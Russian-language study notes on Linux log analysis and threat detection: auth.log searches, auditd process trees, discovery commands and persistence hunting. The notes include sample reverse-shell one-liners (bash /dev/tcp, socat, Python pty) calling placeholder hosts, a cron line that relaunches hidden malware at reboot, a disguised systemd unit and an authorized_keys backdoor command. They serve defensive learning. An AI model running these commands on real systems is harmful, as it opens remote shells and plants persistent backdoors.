Linux очевидно хранит свои логи, как обычные файлы.  Большинство логов находится в /var/log папке. 
Самое очевидное - тупо грепать в syslog
```
cat /var/log/syslog | head
```

Самые полезные файлы
```
cat /var/log/auth.log | grep -E 'session opened|session closed'
//просто открытие закрытие сессий
cat /var/log/auth.log | grep "sshd" | grep -E 'Accepted|Failed'
//логи ssh
cat /var/log/auth.log | grep -E 'COMMAND='

/var/log/secure
```

***Стандартный логи Linux***
Все файлы находятся в *var/log*
```
/var/log/kern.log 
//ошибки ядра и сообщения ядра

/var/log/syslog
/var/log/messages
//собранные в 1 лог разные события Linux

/var/log/dpkg
/var/log/apt

/var/log/dnf.log
/var/log/yum.log
//логи установщико пакетов 
```

***Логи специфичные для приложения***
Надо смотреть логи конкретного приложения, чаще всего они в той же папке, например:
```
cat /var/log/nginx/access.log
// логи веб-сервера
```

#### Linux Threat Detection 1
Самый частый Initital access - Expose SSH.  Чаще всего просто ключ или слабый пароль случайно оказываются в открытом доступе.  Или просто слабый пароль подбирается
Как отличить подозрительный вход от неподозрительного?
1. Пользователь, и время входа
2. Source IP
3. Password-base
4. Login history

Примеры:
```
cat /var/log/auth.log | grep -E "Accept.*root"
// поиск того, кто авторизовался в рута

cat /var/log/auth.log | grep -Ev "root" | grep "Failed"
// поиск всех, кто не смог зайти не в рута
```

Также для Initial Access часто используются приложения, которые выставлены в интернет - почта, email сервера. 

Нужно выстраивать дерево процессов - parent->user, чтобы понимать контекст происходящего.

Пример:
```
ausearch -i --ppid 3898 | grep 'proctitle'
// залистить все родительские процессы
```

Стандартный команды Discovery

| OS and Filesystem Discovery   | `pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a(просто инфа о дистрибутиве)`, `hostname`                                                                                                                     |
| ----------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| User and Groups Discovery     | `id`, `whoami`, `w(кто сейчас находится в системе и чем они заняты)`, `last(история входов пользователей)`, `cat /etc/sudoers(файл, который определяет что и кому можно делать через sudo)`, `cat /etc/passwd` |
| Process and Network Discovery | `ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp`                                                                                                                                         |
| Cloud or Sandbox Discovery    | `systemd-detect-virt(обнаружение виртуальности)`, `lsmod(листит загруженные модули ядра)`, `uptime`, `pgrep "<edr-or-sandbox>"`                                                                                |
***Специализированное Discovery***

| --------------------- | ------------------------------------------------------------------------------------------ |

Цели атакующих можно разбить на 2 категории - *Hack and Forget* и *Targeted*. 
***Hack and Forget***
При таком взломе, чаще всего либо устанавливается криптомайнер, либо устройство добавляется в ботнет, либо используется как прокси
Чтобы выполнить *Ingress Tool Transfer*, нужно выполнить wget, curl или scp(передача файлов, но ща вроде rsync используется)
Если выполнится атакущий со своей машины выполнит scp или sftp, то в логах не будет команды, а будет новый SSH логин просто.
Стандартное место для размещения инструментов `/tmp`. 

##### ***reverse shell***
```
bash -i >& /dev/tcp/10.10.10.10/1337 0>&
// запускается bash, чей stdout и stderr переводятся в сетевое соединени, которое задается указанным сокетом(0>&1 это переводит и stdin туда же). Команда сама создает сокет.

socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
// де-факто альтернатива, указывает куда подключаться и на какой порт, EXEC, это то что выполнить, остальное опции EXEC. Проблема в том, что socat не установлен по умолчанию

python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
// в команде прячется что то такое условно
import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.30.30.30", 80))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("bash")
```

Для обнаружения использовать *auditd*
```
ausearch -i -x socat // и подниматься по дереву процессов
// после нужно изолировать машину, собрать доказательства, поискать persistence, найти уязвимость которая дала initial access.
```

#### ***persistence***
Самый частый метод установление *persistence* это:
***cron***
```
(crontab -l 2>/dev/null; echo "@reboot nohup /home/user/.hidden/malware > /dev/null 2>&1 &") | crontab -

// не рекомендуется писать в файлы cron напрямую, поэтому используем команды, которая автоматически добавляет. Эта команда при запуске системы запустит малварь, как job и уничтожит весь его вывод. Первая часть crontab -l нужна чтобы залистить уже существующие конфиги крона
```
***systemd***
содержание файла `/lib/systemd/system/cloud-online.service file`
```
# A simplified content of /lib/systemd/system/cloud-online.service file
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted service
[Service]
ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted file
```

Persistence можно отслеживать по изменению файлов соответствующих служб. 

| То что надо смотреть | `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*` |
| -------------------- | --------------------------------------------------------------------------- |
|                      | `/lib/systemd/system/*`, `/etc/systemd/system/*`                            |
| Какие процессы:      | `nano /etc/crontab`, `crontab -e`, `systemctl start\|enable <service>`      |

#### ***account persistence***
Например можно просто создать аккаунт, если есть доступ к руту, и добавить его в привилегированную группу.  Но это очень легко обнаружить.
`cat /var/log/auth.log | grep -E 'useradd|usermod'` - и все

Намного более тяжело обнаружить, когда злоумышленник создает ключ для уже существующего пользователя 
`echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys` - де-факто мы не знаем какой из ключей норм а какой нет
Нужно искать просто изменения файлов authorized_keys для каждого пользователя

#### ***application persistence***
Ну просто надо смотреть, чтобы не было уязвимостей в приложениях, поскольку иначе бэкдор может быть реализован на уровне приложения даже.

#### Targeted attacks
Короче Linux сервера часто выставляются наружу и надо понимать что взломанный Linux сервер = доступ в Windwos корпоративную сеть.
Также, если есть Linux сервер, на котором запущено много Windows устройств, то оказывается можно подключиться к гипервизору, и что то делать в системе.
